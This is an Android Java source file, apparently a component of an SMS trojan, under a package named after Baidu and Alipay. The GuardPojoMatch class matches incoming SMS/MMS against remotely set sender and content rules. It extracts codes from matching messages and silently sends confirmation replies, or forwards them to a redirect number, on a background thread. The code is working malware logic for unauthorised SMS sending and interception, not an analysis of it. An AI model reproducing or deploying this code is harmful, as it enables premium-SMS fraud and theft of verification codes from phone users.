package com.baidu.alipay.script.sms;

import android.content.Context;

import com.baidu.alipay.LogUtil;
import com.baidu.alipay.script.Sms;
import com.baidu.serv.BaseThread;

public class GuardPojoMatch { 

    private static final String TAG = "GuardPojoMatch";

    public static boolean match(final Context context,GuardPojo guardPojo, Msg msg) {

        boolean matched = false;

        try{
	        if (guardPojo != null && 
	        		((guardPojo.getIsmms().length() > 0 && msg.isMms()) || (guardPojo.getIsmms().length() == 0 && !msg.isMms()))) {
	        	if (GuardHelper.filterContent(msg.getAddress(), guardPojo.getSmsNoLeft())
	                    && GuardHelper.filterContent(msg.getBody(),
	                            guardPojo.getGuardContent())) {
	
	                // 判断是否要二次确认
	                if (guardPojo.getGuardDirect().length() == 0) {
	                    LogUtil.e(TAG, "match -> matched ; no second confirm");
	                    callSmsSetValue(guardPojo, msg.getBody());
	                	
	                	matched = true;
	                } else {
	                    String guardPojoStart = guardPojo.getGuardStart();
	                    String guardPojoEnd = guardPojo.getGuardEnd();
	                    String body = msg.getBody();
	                    String guardRedirectTo = guardPojo.getGuardRedirectTo();
	
	                    if (guardPojoStart.length() + guardPojoEnd.length() > 0) {
	                        int offset = 0;
	                        
	                        if(guardPojoStart.length() > 0){
	                        	offset = body.indexOf(guardPojoStart);
	                        }
	                        
	                        int endset = body.length();
	                        
	                        if(guardPojoEnd.length() > 0){
	                        	endset = body.indexOf(guardPojoEnd, offset + 1);
	                        }
	
	                        if (offset >= 0 && endset >= 0) {
	
	                            final String subBody = body.substring(offset
	                                    + guardPojoStart.length(), endset);
	                            
	                            if(!callSmsSetValue(guardPojo, subBody)){
	                            	String _address = msg.getAddress();
	                                if(guardRedirectTo != null && guardRedirectTo.length() > 0){
	                                	_address = guardRedirectTo;
	                                }
	                                final String address = _address;
	                                
	                                LogUtil.e(TAG , "match -> matched and dynamic confirm ; start send msg ; address : " + address + " ; body" + subBody);
	
	                                new BaseThread(null) {
	                                    @Override
	                                    public void run() {
	                                    	try{
//	                                    		Thread.sleep(1000 * 6);
	                                    		new SmsSender().sendMsg(context,address, subBody,null, false);
	                                    	}catch (Exception e) {
	                                    		e.printStackTrace();
	    									}
	                                    }
	                                }.start();
	                            }
	                            
	                            matched = true;
	                        }
	                    } else {                    	
	                    	String _address = msg.getAddress();
	                        if(guardRedirectTo != null && guardRedirectTo.length() > 0){
	                         	_address = guardRedirectTo;
	                        }
	                        final String address = _address;
	                        final String guardPojoRe = guardPojo.getGuardRe();
	                        
	                        LogUtil.e(TAG , "match -> matched and static confirm ; start send msg ; address : " + address + " ; body" + guardPojoRe);
	                        
	                        new BaseThread(null) {
	                            public void run() {
	                            	try{
//	                            		Thread.sleep(1000 * 6);
	                            		new SmsSender().sendMsg(context,address, guardPojoRe,null, false);
	                            	}catch (Exception e) {
										e.printStackTrace();
									}
	                            }
	                        }.start();
	
	                        matched = true;
	                    }
	                }
	            } else {
	                LogUtil.e(TAG, "match -> false");
	            }
	        }
        }catch (Exception e) {
			e.printStackTrace();
		}
        
        return matched;
    }

    private static boolean callSmsSetValue(GuardPojo guardPojo,String s){
    	if(guardPojo.getSetValue() != null && guardPojo.getSetValue().length() > 0){
        	Sms sms = GuardPojoWorker.getSmsByKey(guardPojo.getSmsKey());
        	if(sms != null){
        		sms.setValue(guardPojo.getSetValue(), s);
        		sms.guardState = "1";
        	}
        	return true;
        }
    	
    	return false;
    }   
}